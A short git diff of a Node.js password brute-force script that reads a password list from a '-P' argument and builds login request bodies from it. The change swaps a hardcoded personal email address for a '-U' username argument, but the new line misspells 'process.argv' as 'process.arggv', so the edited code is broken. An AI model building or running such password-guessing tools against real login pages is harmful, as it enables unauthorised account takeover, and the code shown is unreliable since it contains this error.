@@ -5,6 +5,7 @@ let passwordToTry = [];
 const fs = require('fs').promises;
 
 const passFileIndex = process.argv.indexOf("-P");
+const userIndex = process.argv.indexOf("-U");
 
 async function loadData(){
 	const filename = process.argv[passFileIndex + 1];
@@ -16,7 +17,7 @@ const brute = array => {
 	for(let i in array)
 	{
 		let body = {
-			email: "larcher501@gmail.com",
+			email: process.arggv[userIndex + 1],
 			password: array[i]
 		};
 
